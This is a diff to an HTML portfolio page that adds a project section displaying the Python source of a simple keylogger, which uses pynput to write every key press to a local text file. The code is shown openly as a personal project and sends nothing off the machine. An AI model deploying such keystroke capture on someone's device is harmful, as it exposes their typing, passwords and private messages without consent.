@@ -20,7 +20,32 @@
 </div>
 
 <div class="Projets_imgAndDet">
-<img src="images/keylogger-768x403.png" width="450" height="350" />
+ <div class="Code_keylog>
+  <img src="images/keylogger-768x403.png" width="450" height="350" />
+  <code>
+   from pynput import keyboard
+
+
+def keyPressed(key):
+    print(str(key))
+    with open("keyfule.txt", 'a') as logKey:
+        try:
+            char = key.char
+            logKey.write(char)
+        except:
+            print("Error getting char")
+        if key == keyboard.Key.enter:
+            logKey.write("\n")
+        elif key == keyboard.Key.space:
+            logKey.write(' ')
+
+
+if __name__ == "__main__":
+    listener = keyboard.Listener(on_press=keyPressed)
+    listener.start()
+    input()
+  </code>
+ </div>
 
  <details>
   <h3>Technical Details</h3>
@@ -36,7 +61,6 @@
    </li>
   </ul>
  </details>
- 
 </div>
 
 <div class="Projets_Expo">
